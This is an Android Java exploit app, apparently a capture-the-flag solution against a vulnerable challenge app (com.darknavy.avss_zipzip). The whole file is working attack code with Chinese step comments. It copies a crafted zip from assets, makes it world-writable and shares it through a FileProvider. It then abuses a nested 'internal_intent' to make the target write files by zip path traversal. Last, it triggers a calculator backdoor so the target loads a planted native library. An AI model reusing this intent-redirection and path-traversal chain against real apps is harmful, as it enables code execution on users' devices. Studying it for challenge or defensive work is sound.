package com.test.chall_exploit;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Try to bypass check
        dalvik.system.ZipPathValidator.clearCallback(); //useless

        // 1.用FileProvider生成构造的zip包的Uri
        Log.d("Pwn", "Start");
        String assetsFileName = "exp-x64.zip";
        // 把assets的zip复制到files/目录
        File zipFile = new File(getFilesDir() + "/exp/" + assetsFileName);
        try {
            // exec的waitFor很重要
            Runtime.getRuntime().exec("mkdir " + getFilesDir()).waitFor();
            Runtime.getRuntime().exec("mkdir " + getFilesDir() + "/exp/").waitFor();
            InputStream inputStream = getAssets().open(assetsFileName);
            if (!zipFile.exists()) {
                zipFile.createNewFile();
            }
            // zipFile is empty now!!!
            OutputStream outputStream = new FileOutputStream(zipFile);
            byte[] buffer = new byte[2048];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }
            inputStream.close();
            outputStream.close();
            Runtime.getRuntime().exec("chmod -R 777 " + getFilesDir());
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
        Uri fileUri = FileProvider.getUriForFile(getApplicationContext(), "com.test.chall_exploit.FileProvider", zipFile);
        Log.d("Pwn", fileUri.toString());

        // 2.构造Intent，路径穿越写文件
        Intent expIntent = new Intent();
        expIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION|Intent.FLAG_GRANT_WRITE_URI_PERMISSION);//useless
        expIntent.setClassName("com.darknavy.avss_zipzip", "com.darknavy.avss_zipzip.activity.ViewActivity");
        expIntent.putExtra(Intent.EXTRA_STREAM, fileUri);
        // 没有这一段代码的话，vul app不是找不到FileProvider就是没权限
        Context context = getApplicationContext();
        List<ResolveInfo> resInfoList = context.getPackageManager().queryIntentActivities(expIntent, PackageManager.MATCH_DEFAULT_ONLY);
        for (ResolveInfo resolveInfo : resInfoList) {
            String packageName = resolveInfo.activityInfo.packageName;
            Log.d("Pwn", "Grant: "+packageName);
            context.grantUriPermission(packageName, fileUri, Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        }

        Intent intent = new Intent();
        intent.setClassName("com.darknavy.avss_zipzip", "com.darknavy.avss_zipzip.activity.MainActivity");
        intent.putExtra("internal_intent", expIntent);
        startActivity(intent);
        Log.d("Pwn", "startActivity");

        // 3. 触发计算器的后门，加载so库
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(2000); // 休眠1秒
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                Intent calcIntent = new Intent();
                calcIntent.setClassName("com.darknavy.avss_zipzip", "com.darknavy.avss_zipzip.activity.CalcActivity");
                calcIntent.putExtra("calc", "1+2L"); //load
                //Trigger
                Intent intent = new Intent();
                intent.setClassName("com.darknavy.avss_zipzip", "com.darknavy.avss_zipzip.activity.MainActivity");
                intent.putExtra("internal_intent", calcIntent);
                startActivity(intent);
            }
        }).start();
    }
}